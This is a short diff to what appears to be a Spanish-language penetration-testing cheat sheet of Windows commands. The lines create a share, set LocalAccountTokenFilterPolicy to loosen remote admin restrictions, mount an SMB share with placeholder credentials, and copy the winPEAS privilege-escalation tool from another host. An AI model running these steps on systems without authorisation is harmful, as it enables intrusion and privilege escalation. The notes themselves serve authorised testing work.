@@ -155,8 +155,10 @@ net share COMPARTIDA=C:\Windows\Temp /GRANT:Administrators,FULL
 cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v  LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 
 # montar compartida con usuario + contraseña via CMD
-net use \\10.21.7.187\SHARE testing /USER:testing
+net use \\10.16.22.245\SCANNERDOC PASS /user:USER
+net use U: \\10.16.22.245\SCANNERDOC * /user:USER /persistent:no
 copy \\10.21.7.187\SHARE\winPEASx64.exe .
+
 
 # colores en winPEAS:
 REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
